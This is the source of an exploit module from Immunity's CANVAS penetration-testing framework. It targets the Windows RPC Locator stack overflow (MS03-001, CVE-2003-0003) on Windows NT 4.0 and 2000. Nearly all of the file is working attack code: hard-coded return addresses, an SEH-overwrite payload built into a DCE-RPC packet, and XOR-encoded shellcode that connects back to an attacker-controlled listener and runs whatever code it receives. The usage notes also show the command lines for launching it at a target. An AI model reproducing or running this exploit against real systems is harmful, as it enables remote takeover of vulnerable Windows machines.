#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003-2007
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import struct
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from libs.newsmb.libdcerpc import s_dce_raw_unistring
import canvasengine
from msrpcexploit import msrpcexploit

# GUI info
NAME                              = 'Microsoft Windows RPC Locator Overflow'
DESCRIPTION                       = 'Microsoft Windows RPC Locator locator.exe Stack Overflow'
DOCUMENTATION                     = {}
DOCUMENTATION['VENDOR']           = "Microsoft"
DOCUMENTATION['Date public']      = '01/22/03'
DOCUMENTATION['References']       = 'http://www.microsoft.com/technet/security/Bulletin/MS03-001.mspx'
DOCUMENTATION['Repeatability']    = ''
DOCUMENTATION['VersionsAffected'] = ''
DOCUMENTATION["CVE Name"]         = "CVE-2003-0003"
DOCUMENTATION["CVE Url"]          = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0003"
DOCUMENTATION['CVSS']             = 7.5
VERSION='1.0'
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['NT','2000']
PROPERTY['MSADV']='MS03-001'

CHANGELOG="""
KK 01/18/07:
Rewritten
"""

NOTES="""
Tested on:
Windows 2000 Server SP1 English OOTB
Windows 2000 Server SP3 English OOTB
Windows 2000 Server SP0 Japanese OOTB
Windows NT 4.0 Server SP6a French OOTB

Usage:
./exploits/ms03_001/ms03_001.py -v 0 -t 10.10.11.132 -l 10.10.11.1 -d 5555
./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
"""

targets={
    0: ['Autoversioning',0],     
    1: ['Windows NT 4.0 SP6a',0x24654f], #jmp esi
    2: ['Windows 2000 SP0-SP3',0x187533], #jmp ebx
}

class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.name           = NAME
        self.port           = 139
        self.host           = ''
        self.version        = 0
        self.badstring      = '\x00\xff'
        self.UUID           = u'd3fbb514-0e3b-11cb-8fad-08002b1d29c3'
        self.uuidversion    = u'1.0'
        self.targetfunction = 0
        self.namedpipe      = 'locator'
        self.autoversion    = 1
        self.listenerArgsDict['fromcreatethread']=1
    
    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def getArgs(self):
        self.host=self.target.interface
        self.namedpipe=self.argsDict.get('namedpipe',self.namedpipe)
        self.port=int(self.argsDict.get('port',self.port))
        self.user=self.argsDict.get('user',self.user)
        self.password=self.argsDict.get('password',self.password)
        if self.version==0: #we don't want result of testOS to be overwritten
            self.version=int(self.argsDict.get('version',self.version))

    def testOS(self):
        self.getArgs()
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        devlog('ms03_001','target=%s->%s'%(self.target,app.target))
        result=app.run()
        if result==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        os=app.result
        if os.base!='Windows':
            self.log('Cannot attack non Windows with this exploit')
            return 0
        if not os.language:
            self.log('No language found, defaulting to engine\'s non-language option %s'%self.engine.osdetect_mode)
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NO_RUN:
                self.log('Not running, could not find language')
                return 0
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_ONE_LANG:
                self.log('Assuming language %s'% self.engine.osdetect_lang)
                os.language=self.engine.osdetect_lang
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NEAREST_NEIGHBOR:
                self.log('Nearest neighbor algorithm not yet implemented')
                return 0
        if os.version=='NT':
            self.log('Attacking Windows NT 4.0 language: %s'%(os.language))
            self.version=1
            return 1
        elif os.version=='2000':
            self.log('Attacking Windows 2000 language: %s'%(os.language))
            self.version=2
            return 1
        else:
            self.log('OS not vulnerable: %s'%(result))
        return 0

    def buildConnectionList(self):
        self.getArgs()
        self.log('Setting named pipe: %s'%(self.namedpipe))
        self.connectionList=['ncacn_np:%s[\\%s]'%(self.host,self.namedpipe)]
        return self.connectionList

    def createShellcode(self):
        import shellcodeGenerator
        sc = shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp',{'subespval':0})
        sc.addAttr('revert_to_self_before_importing_ws2_32', None)
        sc.addAttr('tcpconnect',{'port':self.callback.port,'ipaddress':self.callback.ip})
        sc.addAttr('CreateThreadRecvExecWin32',{'socketreg':'FDSPOT'}) #MOSDEF
        sc.addAttr('ExitThread', None)
        rawshellcode=sc.get()
        import xorencoder
        encoder=xorencoder.simpleXOR()
        encoder.setbadstring(self.badstring)
        ret=encoder.find_key(rawshellcode)
        if ret==0:
            self.log('Could not find a key for this shellcode!')
            raise Exception,'No shellcode generated'
        self.shellcode = encoder.encode(rawshellcode)
        if self.shellcode=='':
            raise Exception,'No shellcode generated'
        self.log('Xor key used: %x'%(encoder.getkey()))
        self.log('Length of shellcode=%s'%(len(self.shellcode)))
        return self.shellcode

    def buildDcePacket(self):
        self.description,self.eip=targets[self.version]
        data=''
        data+='/\x00.\x00:\x00/\x00'
        payload=''
        if self.version==1: #NT 4.0
            payload+='A'*0xf8
            payload+='\xeb\x06' #jmp forward
            payload+='BB'
            payload+=struct.pack('<L',self.eip) #SEH
            from MOSDEF import mosdef
            payload+=mosdef.assemble('jmp $+%d'%(0x114-(len(payload)+2)+4),'x86') #jmp forward
            payload+='C'*(0x114-len(payload))
            payload+='DDD\xff' #access violation
            payload+=self.shellcode
        elif self.version==2: #2000
            payload+=self.shellcode
            payload+='A'*(0x4f8-len(payload))
            payload+='\xeb\x06' #jmp forward
            payload+='BB'
            payload+=struct.pack('<L',self.eip) #SEH
            from MOSDEF import mosdef
            payload+=mosdef.assemble('jmp $-%d'%(len(payload)+5),'x86') #jmp backward
            payload+='C'*(0x514-len(payload))
            payload+='DDD\xff' #access violation
        data+=payload
        packet=''
        packet+=struct.pack('<L',3)
        packet+=struct.pack('<L',1) #[unique]
        packet+=s_dce_raw_unistring(data)
        packet+=struct.pack('<L',0)
        packet+=struct.pack('<LHHBBBBBBBB',0,0,0,0,0,0,0,0,0,0,0)
        packet+=struct.pack('<HH',0,0)
        packet+=struct.pack('<LHHBBBBBBBB',0,0,0,0,0,0,0,0,0,0,0)
        packet+=struct.pack('<HH',0,0)
        packet+=struct.pack('<L',0)
        packet+=struct.pack('<L',0)
        return packet

    def displayVersions(self):
        i=0
        for listline in targets.values():
            print '%d: %s'% (i,listline[0])
            i=i+1

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0, 1, None] and hasattr(ret,'interact'):
        ret.interact()
